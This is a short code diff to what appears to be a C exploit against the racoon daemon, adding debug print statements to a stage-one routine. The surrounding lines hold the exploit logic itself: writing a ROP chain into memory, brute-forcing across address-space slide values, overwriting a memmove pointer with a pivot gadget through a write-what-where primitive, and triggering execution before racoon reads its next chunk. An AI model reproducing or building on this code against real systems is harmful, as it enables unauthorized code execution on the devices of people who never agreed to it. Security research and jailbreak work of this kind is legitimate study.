@@ -46,6 +46,7 @@ void stage1(int fd, offset_struct_t * offsets) {
 	rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
 	uint64_t curr_ropchain_addr = ropchain_addr;
 
+    LOG("Writing inital chain");
 	while (curr_gadget != NULL) {
 		switch(curr_gadget->type) {
 			case STATIC:
@@ -65,6 +66,7 @@ void stage1(int fd, offset_struct_t * offsets) {
 	int iterations = (offsets->max_slide/offsets->slide_value); // calculate the number of iterations we need to perform this
 	LOG("%d iterations",iterations);
 	for (int i = iterations; i >= 0; i--) { // we start with the biggerst slide and then get smaller slides because the memmove ptr is at the front of the cache so we need to start from behind so that the address we write to is always mapped
+        printf("Writing iteration %d\n",i);
 		uint64_t slide = i*offsets->slide_value; // calc current slide
 
 		// write gadgets
@@ -83,6 +85,7 @@ void stage1(int fd, offset_struct_t * offsets) {
 		}
 		// we have to write and then trigger right afterwards otherwise racoon might call fread between the write and the trigger
 		// to get a new chunk of data and then fread will use the corrupted memmove pointer
+        printf("Memmove write:\n");
 		www64(fd,offsets,offsets->memmove+slide,offsets->pivot_x21+slide);
 		trigger_exec(fd,offsets->str_buff_offset, ropchain_addr);
 	}
